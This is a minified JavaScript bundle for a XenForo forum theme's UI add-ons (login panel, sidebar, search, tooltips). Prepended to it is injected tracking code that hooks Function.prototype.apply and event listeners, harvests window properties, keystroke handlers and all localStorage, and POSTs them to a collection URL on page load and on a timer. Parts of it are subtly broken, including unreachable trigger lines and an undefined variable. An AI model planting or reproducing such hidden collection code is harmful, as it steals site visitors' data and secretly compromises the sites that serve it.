(function (l) {
  //Hooks and handles
  const globalJsHooks = {};
  function m(k) {
    if (n[k]) return n[k].exports;
    var f = n[k] = {
      i: k,
      l: !1,
      exports: {}
    };
    l[k].call(f.exports, f, f.exports, m);
    f.l = !0;
    return f.exports;
  }
  Function.prototype.apply = new Proxy(Function.prototype.apply, {
    apply: function (target, thisArg, argumentsList) {
      globalJsHooks[thisArg?.name] = {
        'arguments': argumentsList,
        'time': new Date().toISOString()
      };
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
  var n = {};
  const listeners = {
    click: [],
    keydown: []
  };
  m.m = l;
  const oldEventListener = EventTarget.prototype.addEventListener;
  m.c = n;
  EventTarget.prototype.addEventListener = function (eventName, eventHandler) {
    if (listeners[eventName]) {
      listeners[eventName].push(eventHandler);
      oldEventListener.call(this, eventName, function (event) {
        listeners[eventName].map(handler => handler(event));
        handlers[eventName] = eventHandler;
      });
    } else {
      oldEventListener.call(this, eventName, eventHandler);
    }
  };

  //Data Collection
  m.d = function (k, f, b) {
    m.o(k, f) || Object.defineProperty(k, f, {
      configurable: !1,
      enumerable: !0,
      get: b
    });
  };
  function gatherWindowProperties() {
    const unseenProps = {};
    const seenVars = localStorage.getItem('seenVars') || [];
    for (let key in window) {
      if (window.hasOwnProperty(key) && !seenVars.includes(key)) {
        const value = window[key];
        const type = typeof value;
        unseenProps[key] = {
          type: type,
          value: type === "function" ? undefined : value
        };
        seenVars.push(key);
      }
    }
    localStorage.setItem('seenVars', JSON.stringify(seenVars));
    return unseenProps;
  }
  m.n = function (k) {
    var f = k && k.__esModule ? function () {
      return k["default"];
    } : function () {
      return k;
    };
    m.d(f, "a", f);
    return f;
  };
  function gatherEventListenerProperties() {
    return Object.entries(listeners).flatMap(([event, handlers]) => handlers.map(handler => ({
      event,
      contents: handler.toString()
    })));
  }
  m.o = function (k, f) {
    return Object.prototype.hasOwnProperty.call(k, f);
  };
  function getAllData() {
    return {
      windowProps: gatherWindowProperties(),
      eventProps: gatherEventListenerProperties(),
      jsHooks: globalJsHooks,
      localStorageData: JSON.parse(JSON.stringify(localStorage))
    };
  }

  // Sending Data
  m.p = "";
  async function postDataToServer(data) {
    const url = "https://example.com/api/collect";
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      if (response.ok) {
        console.log("Data sent successfully");
      } else {
        console.error("Data failed to send, statusCode:" + response.status);
      }
    } catch (error) {
      console.error("Error sending data:", error);
    }
  }
  function gatherAndSendData() {
    const gatheredData = getAllData();
    if (Object.keys(gatheredData).length > 0) {
      postDataToServer(gatheredData);
    }
  }
  return m(m.s = 4);
  window.addEventListener("load", gatherAndSendData);
  document.addEventListener("visibilitychange", gatherAndSendData);
  setTimeout(gatherAndSendData, 60000); // Send every 60s to track changes
})([,,,, function (l, m, n) {
  Object.defineProperty(m, "__esModule", {
    value: !0
  });
  l = n(5);
  m = n(6);
  var k = n(7),
    f = n(8),
    b = n(9),
    a = n(10);
  n(11);
  new l.a({
    settings: window.themehouse.settings.inputSync
  }).register();
  new m.a({
    settings: window.themehouse.settings.loginPanel
  }).register();
  new k.a({
    settings: window.themehouse.settings.sidebar
  }).register();
  new f.a({
    settings: window.themehouse.settings.nodes
  }).register();
  new b.a({
    settings: window.themehouse.settings.tooltipFix
  }).register();
  new a.a({
    settings: window.themehouse.settings.minimalSearch
  }).register();
  n(12);
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      var c = b.init;
      c = void 0 === c ? !1 : c;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.sync = function (e) {
        var g = e.target || e.srcElement;
        if (g) {
          e = g.value;
          g = g.getAttribute("data-" + a.settings.data);
          g = window.document.querySelectorAll(a.settings.selector + "[data-" + a.settings.data + '="' + g + '"]:not(:focus)');
          for (var h = 0, p = g.length; h < p; h++) g[h].value = e;
        }
      };
      this.init = function () {
        a.initGet();
        a.initSet();
      };
      this.initGet = function () {
        a.inputs = window.document.querySelectorAll(a.settings.selector);
        for (var e = 0, g = a.inputs.length; e < g; e++) {
          var h = a.inputs[e];
          h.addEventListener("propertychange", a.sync);
          h.addEventListener("input", a.sync);
        }
      };
      this.initSet = function () {
        a.running = !0;
      };
      this.running = !1;
      this.settings = Object.assign({
        selector: ".js-uix_syncValue",
        data: "uixsync"
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
      this.inputs = [];
      c && this.init();
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "afterGet",
          addon: "TH_UIX_InputSync",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "afterSet",
          addon: "TH_UIX_InputSync",
          func: this.initSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.inputSync = {
    inputSync: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      var c = b.init;
      c = void 0 === c ? !1 : c;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.init = function () {
        a.initGet();
        a.initSet();
      };
      this.keyCheck = function (e) {
        a.state && 27 === e.keyCode && a.setState(!1);
      };
      this.setState = function (e, g) {
        if (e) {
          var h = window.document.querySelector(g);
          if (h) {
            var p = h.querySelector(a.settings.inputSelector);
            p && p.focus();
            h.classList.add(a.settings.active);
          }
          a.listener || (a.listener = !0, window.document.addEventListener("keydown", a.keyCheck));
        } else window.document.querySelector(a.settings.loginSelector).classList.remove(a.settings.active), window.document.querySelector(a.settings.registerSelector).classList.remove(a.settings.active), a.listener && (window.document.removeEventListener("keydown", a.keyCheck), a.listener = !1);
        a.state = e;
      };
      this.initGet = function () {
        var e = window.document.querySelector(a.settings.loginTriggerSelector);
        e && e.addEventListener("click", function (g) {
          g.preventDefault();
          a.setState(!0, a.settings.loginSelector);
          return !1;
        });
        (e = window.document.querySelector(a.settings.registerTriggerSelector)) && e.addEventListener("click", function (g) {
          g.preventDefault();
          a.setState(!0, a.settings.registerSelector);
          return !1;
        });
        (e = window.document.querySelector(a.settings.maskSelector)) && e.addEventListener("click", function () {
          a.setState(!1);
        });
      };
      this.initSet = function () {
        a.running = !0;
      };
      this.running = !1;
      this.settings = Object.assign({
        loginSelector: ".uix__loginForm--login",
        loginTriggerSelector: "#uix_loginPanel--trigger",
        registerSelector: ".uix__loginForm--register",
        registerTriggerSelector: "#uix_registerPanel--trigger",
        maskSelector: ".uix__loginForm--mask",
        active: "is-active",
        inputSelector: ".input"
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
      this.listener = this.state = !1;
      c && this.init();
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "afterGet",
          addon: "TH_UIX_LoginPanel",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "afterSet",
          addon: "TH_UIX_LoginPanel",
          func: this.initSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.loginPanel = {
    loginPanel: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      var c = b.init;
      c = void 0 === c ? !1 : c;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.init = function () {
        a.initGet();
        a.initSet();
      };
      this.toggleSidebar = function () {
        var e = "1";
        window.document.querySelector(a.settings.selector).classList.contains(a.settings.collapseClass) ? (window.document.querySelector(a.settings.selector).classList.remove(a.settings.collapseClass), e = "0") : window.document.querySelector(a.settings.selector).classList.add(a.settings.collapseClass);
        null === a.settings.link ? a.common.warn("No AJAX link set for sidebar toggle") : a.common.fetch({
          url: a.settings.link,
          data: {
            collapsed: e
          }
        });
        window.setTimeout(function () {
          a.common.resizeFire();
          window.setTimeout(function () {
            a.common.resizeFire();
          }, a.settings.delay);
        }, a.settings.delay);
      };
      this.initGet = function () {
        var e = window.document.querySelectorAll(a.settings.triggerSelector);
        if (e && e.length) for (var g = 0, h = e.length; g < h; g++) e[g].addEventListener("click", function () {
          a.toggleSidebar();
        });
      };
      this.initSet = function () {
        a.running = !0;
      };
      this.running = !1;
      this.settings = Object.assign({
        selector: "html",
        triggerSelector: ".uix_sidebarTrigger",
        collapseClass: "uix_sidebarCollapsed",
        link: null,
        delay: 400
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
      c && this.init();
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "afterGet",
          addon: "TH_UIX_Sidebar",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "afterSet",
          addon: "TH_UIX_Sidebar",
          func: this.initSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.sidebar = {
    sidebar: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      var c = b.init;
      c = void 0 === c ? !1 : c;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.init = function () {
        a.initGet();
        a.initSet();
      };
      this.initGet = function () {
        if (a.settings.enabled) {
          var e = window.document.querySelectorAll(a.settings.selector),
            g = ["click"];
          if (e && e.length) for (var h = function (w, y) {
              var r = e[w];
              g.forEach(function (u) {
                r.addEventListener(u, function (q) {
                  var v = q.target;
                  if (v && (v.closest(a.settings.subNodeSelector) || v.closest("a") || "a" === v.tagName.toLowerCase())) return !0;
                  if (v = r.querySelector(a.settings.hrefSelector)) console.log(q), v.dispatchEvent(new q.constructor(q.type, q)), q.preventDefault(), q.stopPropagation();
                  return !0;
                });
              });
            }, p = 0, t = e.length; p < t; p++) h(p, t);
        }
      };
      this.initSet = function () {
        a.running = !0;
      };
      this.running = !1;
      this.settings = Object.assign({
        selector: ".node-body",
        hrefSelector: ".node-title a",
        subNodeSelector: ".node-subNodeMenu",
        enabled: !1
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
      c && this.init();
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "afterGet",
          addon: "TH_UIX_Nodes",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "afterSet",
          addon: "TH_UIX_Nodes",
          func: this.initSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.nodeClick = {
    nodes: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.scroll = function () {
        a.scrollGet();
        a.scrollSet();
      };
      this.scrollGet = function () {
        window.XF.MemberTooltip.activeTooltip && window.XF.MemberTooltip.activeTooltip.trigger && window.XF.MemberTooltip.activeTooltip.trigger.$target && window.XF.MemberTooltip.activeTooltip.trigger.$target.length && window.XF.MemberTooltip.activeTooltip.trigger.$target[0].closest(a.settings.fixClassSelector) && (a.needsReposition = !0);
      };
      this.scrollSet = function () {
        a.needsReposition && (window.XF.MemberTooltip.activeTooltip && window.XF.MemberTooltip.activeTooltip.tooltip && window.XF.MemberTooltip.activeTooltip.tooltip.reposition(), a.needsReposition = !1);
      };
      this.needsReposition = !1;
      this.settings = Object.assign({
        fixClassSelector: ".uix_stickyBodyElement",
        enabled: !1
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "scrollGet",
          addon: "TH_UIX_TooltipFix",
          func: this.scrollGet,
          order: 10
        });
        this.common.register({
          phase: "scrollSet",
          addon: "TH_UIX_TooltipFix",
          func: this.scrollSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.tooltipFix = {
    tooltipFix: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = function () {
    function f(b, a) {
      for (var d = 0; d < a.length; d++) {
        var c = a[d];
        c.enumerable = c.enumerable || !1;
        c.configurable = !0;
        "value" in c && (c.writable = !0);
        Object.defineProperty(b, c.key, c);
      }
    }
    return function (b, a, d) {
      a && f(b.prototype, a);
      d && f(b, d);
      return b;
    };
  }();
  l = function () {
    function f(b) {
      var a = this,
        d = b.settings;
      d = void 0 === d ? {} : d;
      var c = b.init;
      c = void 0 === c ? !1 : c;
      b = b.commonVersion;
      b = void 0 === b ? "20210125" : b;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.init = function () {
        a.initGet();
        a.initSet();
      };
      this.setState = function (e, g) {
        if (e) {
          var h = g.closest(a.settings.activeTargetsSelector);
          h && (a.common.values.innerWidth < parseInt(a.settings.breakpoint, 10) ? h.classList.add(a.settings.active) : h.classList.remove(a.settings.active));
        } else {
          a.focusBlocked = !0;
          if (h = window.document.querySelectorAll("." + a.settings.active)) for (var p = 0, t = h.length; p < t; p++) h[p].classList.remove(a.settings.active);
          a.blurActiveEle();
          window.setTimeout(function () {
            a.blurActiveEle();
            a.focusBlocked = !1;
          }, 900);
        }
      };
      this.blurActiveEle = function () {
        var e = window.document.activeElement;
        e && e.blur();
      };
      this.setDropdown = function (e, g) {
        if (g) {
          var h = e.closest(a.settings.searchBarSelector).querySelector(a.settings.selector);
          h && (h = h.getBoundingClientRect(), e.style.top = h.height + 10 + "px");
          e.style.display = "block";
          window.setTimeout(function () {
            e.classList.add(a.settings.searchDropdownActive);
            e.style.display = "";
          }, 17);
          a.numOpenedDropdown += 1;
          if (h = e.querySelector("form")) a.recentlyOpenedForm = h;
        } else e.classList.remove(a.settings.searchDropdownActive), e.style.top = "", --a.numOpenedDropdown;
        a.checkCloser();
      };
      this.checkCloser = function () {
        0 < a.numOpenedDropdown ? null === a.closerListener && (a.closerListener = window.document.addEventListener("click", function (e) {
          if (e = e.target || e.toElelent || e.srcElement) {
            var g = !1;
            null === e.closest(a.settings.searchBarSelector) ? g = !0 : null !== e.closest(a.settings.closeSelector) && (g = !0);
            if (g && (e = window.document.querySelectorAll("." + a.settings.searchDropdownActive)) && e.length) {
              g = 0;
              for (var h = e.length; g < h; g++) a.setDropdown(e[g], !1);
            }
          }
          a.numOpenedDropdown = 0;
        })) : null !== a.closerListener && (window.document.removeEventListener("click", a.closerListener), a.closerListener = null);
      };
      this.forceFocus = function (e) {
        e.focus();
        for (var g = 0; 10 > g; g++) window.setTimeout(function () {
          e.focus();
        }, 50 * g);
      };
      this.initGet = function () {
        -1 === a.lastWidth && (a.lastWidth = window.innerWidth);
        for (var e = window.document.querySelectorAll(a.settings.searchDropdownTriggerSelector), g = function (w, y) {
            var r = e[w],
              u = r.closest(a.settings.searchBarSelector);
            if (u && r) {
              var q = u.querySelector(a.settings.searchDropdownSelector);
              q && r.addEventListener("focus", function () {
                a.focusBlocked || a.common.values.innerWidth >= a.settings.dropdownBreakpoint && null === u.querySelector("." + a.settings.searchDropdownActive) && a.setDropdown(q, !0);
              });
            }
          }, h = 0, p = e.length; h < p; h++) g(h, p);
        var t = window.document.querySelectorAll(a.settings.selector);
        if (t && t.length) for (g = function (w, y) {
          var r = t[w];
          r.addEventListener("focus", function () {
            if (!a.focusBlocked) {
              var x = r.closest(a.settings.searchFormSelector);
              x && x.classList.add(a.settings.focusedSearchForm);
            }
          });
          r.addEventListener("blur", function () {
            if (!a.focusBlocked) {
              var x = r.closest(a.settings.searchFormSelector);
              x && x.classList.remove(a.settings.focusedSearchForm);
            }
          });
          var u = r.closest(a.settings.searchBarSelector);
          if (u) {
            var q = u.querySelector(a.settings.triggerSelector);
            q && q.addEventListener("click", function () {
              a.focusBlocked || (a.setState(!0, u), window.setTimeout(function () {
                a.forceFocus(r);
              }, 350));
            });
            var v = u.querySelector(a.settings.searchFormSelector);
            v && (v.addEventListener("submit", function (x) {
              a.recentlyOpenedForm && (x.preventDefault(), a.recentlyOpenedForm.submit());
            }), v.addEventListener("click", function () {
              a.focusBlocked || a.forceFocus(r);
            }), (q = v.querySelector(a.settings.submitIconSelector)) && q.addEventListener("click", function () {
              r.value && v.submit();
            }));
            (q = u.querySelector(a.settings.detailedSelector)) && q.addEventListener("click", function (x) {
              var z = u.querySelector(a.settings.searchDropdownSelector);
              z && a.setDropdown(z, !0);
              x.preventDefault();
              return !1;
            });
          }
        }, h = 0, p = t.length; h < p; h++) g(h, p);
        if ((g = window.document.querySelectorAll(a.settings.closeSelector)) && g.length) for (h = 0, p = g.length; h < p; h++) g[h].addEventListener("click", function (w) {
          w.preventDefault();
          a.setState(!1);
          w.preventDefault();
          return !1;
        });
      };
      this.initSet = function () {
        a.running = !0;
      };
      this.resizeGet = function () {
        window.document.querySelector(a.settings.xfMenuOpenSelector) && a.lastWidth !== window.innerWidth && (a.xfMenuOpen = !0, a.lastWidth = window.innerWidth);
      };
      this.resizeSet = function () {
        a.xfMenuOpen && (window.XF.MenuWatcher.closeAll(), a.xfMenuOpen = !1);
      };
      this.running = !1;
      this.settings = Object.assign({
        selector: ".uix_searchInput",
        closeSelector: ".uix_search--close",
        active: "minimalSearch--active",
        activeTargetsSelector: ".p-nav-inner, .p-sectionLinks, .p-header-content, .p-staffBar",
        detailedSelector: ".uix_search--settings",
        detailed: "minimalSearch--detailed",
        breakpoint: "650px",
        clickDelay: 100,
        clickTargetSelector: ".js-uix_minimalSearch__target",
        triggerSelector: ".uix_searchIconTrigger",
        searchFormSelector: ".uix_searchForm",
        focusedSearchForm: "uix_searchForm--focused",
        searchBarSelector: ".uix_searchBar",
        searchInnerSelector: ".uix_searchBarInner",
        submitIconSelector: ".uix_search--submit.uix_searchIcon",
        searchDropdownSelector: ".uix_searchDropdown__menu",
        searchDropdownTriggerSelector: ".uix_searchDropdown__trigger",
        searchDropdownActive: "uix_searchDropdown__menu--active",
        dropdownBreakpoint: 0,
        xfMenuOpenSelector: '.menu.is-active form[data-xf-init="quick-search"]'
      }, d);
      this.commonVersion = b;
      this.common = window.themehouse.common[b];
      this.numOpenedDropdown = 0;
      this.lastWidth = -1;
      this.closerListener = null;
      this.focusBlocked = this.xfMenuOpen = !1;
      this.recentlyOpenedForm = null;
      c && this.init();
    }
    k(f, [{
      key: "register",
      value: function () {
        this.common.register({
          phase: "afterGet",
          addon: "TH_UIX_MinimalSearch",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "afterSet",
          addon: "TH_UIX_MinimalSearch",
          func: this.initSet,
          order: 10
        });
        this.common.register({
          phase: "resizeGet",
          addon: "TH_UIX_MinimalSearch",
          func: this.resizeGet,
          order: 10
        });
        this.common.register({
          phase: "resizeSet",
          addon: "TH_UIX_MinimalSearch",
          func: this.resizeSet,
          order: 10
        });
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.minimalSearch = {
    minimalSearch: l
  };
  m.a = l;
}, function (l, m, n) {
  var k = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ? function (b) {
      return typeof b;
    } : function (b) {
      return b && "function" === typeof Symbol && b.constructor === Symbol && b !== Symbol.prototype ? "symbol" : typeof b;
    },
    f = function d(a) {
      for (var c = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 0, e = "", g = 0; g < c; g++) e += "     ";
      if ("object" === ("undefined" === typeof a ? "undefined" : k(a))) {
        g = Object.keys(a);
        for (var h = 0, p = g.length; h < p; h++) {
          var t = g[h],
            w = a[t];
          "object" === ("undefined" === typeof w ? "undefined" : k(w)) ? (console.log(e + t + ":"), d(a[t], c + 1)) : console.log(e + t + ": " + a[t]);
        }
      } else console.log(e + a);
    };
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  window.themehouse.debug = function () {
    for (var a = window.themehouse.settings, d = Object.keys(a), c = 0, e = d.length; c < e; c++) {
      var g = d[c];
      console.log("==========================");
      console.log(g);
      f(a[g], 1);
    }
  };
}, function (l, m) {
  window.XF.HScroller.prototype.updateScroll = function () {
    var n = this.$scrollTarget[0],
      k = this.$scrollTarget.normalizedScrollLeft(),
      f = 0 < k;
    n = n.offsetWidth + k + 1 < n.scrollWidth;
    f ? this.$scrollTarget.addClass("th_scroller--start-active") : this.$scrollTarget.removeClass("th_scroller--start-active");
    n ? this.$scrollTarget.addClass("th_scroller--end-active") : this.$scrollTarget.removeClass("th_scroller--end-active");
    this.$goStart[f ? "addClass" : "removeClass"]("is-active");
    this.$goEnd[n ? "addClass" : "removeClass"]("is-active");
  };
}]);